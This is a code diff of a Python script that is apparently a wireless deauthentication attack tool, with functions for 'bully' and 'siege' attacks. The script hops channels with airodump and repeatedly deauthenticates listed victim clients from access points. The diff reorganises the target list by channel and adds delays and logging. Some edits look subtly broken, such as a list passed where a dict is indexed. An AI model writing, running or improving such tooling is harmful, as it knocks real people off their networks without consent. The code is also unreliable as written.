@@ -4,15 +4,17 @@ import time
 import subprocess
 
 def get_bully_attack_list(d, victim):
-    l = []
+    l = {}
     for channel in d[victim]["channels"]:
+        if not channel in l:
+            l[channel] = []
         for bssid in d[victim]["channels"][channel]:
-            l.append({"channel": channel, "client_mac": victim, "ap_mac":bssid})
+            l[channel].append({"client_mac":victim, "ap_mac":bssid})
     return l
 
 def get_siege_attack_list(d, essid, clients):
     # list of dictionaries to make it easy to change channels
-    l = []
+    l = {}
     for channel in d[essid]:
         for  ap_mac in d[essid][channel]:
             for client_mac in d[essid][channel][ap_mac]:
@@ -73,17 +75,21 @@ def begin_attack(
     TIME_DIFF = 0
 
     i = 0
+    channels = list(attack_list.keys())
 
     while (datetime.now()-CURR_TIME).total_seconds() < attack_time:
 
-        channel = attack_list[i]["channel"]
+        channel = channels[i]
         # set the channel
+        time.sleep(.5)
+        print ("starting airodump")
         airodump = hop_to_channel(channel)
-        attack_clients(attack_list[i], 1, wireless_adapter, list_cycles=2, time_between_cycles=0 )
+        time.sleep(.5)
+        attack_clients(attack_list[channel], 1, wireless_adapter, list_cycles=2, time_between_cycles=0 )
         airodump.kill()
         print ("airodump killed")
-        TIME_DIFF = datetime.now() - CURR_TIME
-        i = i + 1 if i < len (attack_list) else 0
+        #TIME_DIFF = datetime.now() - CURR_TIME
+        i = (i + 1) % len(channels) - 1
     return 0
 
 
@@ -147,13 +153,15 @@ def attack_clients(attack_dict,
             print ("terminating timed attack")
             break
         else:
+            print("de auth client")
             de_auth_client(
                            attack_dict["client_mac"],
                            attack_dict["ap_mac"],
                            deauths=de_auths_per_client,
                            adapter=adapter
                            )
-            print(i)
+            print ("attacked client")
+            print("")
             if time_between_cycles > 0:
                 print ("sleeping for: " + str(time_between_cycles))
                 time.sleep(time_between_cycles)
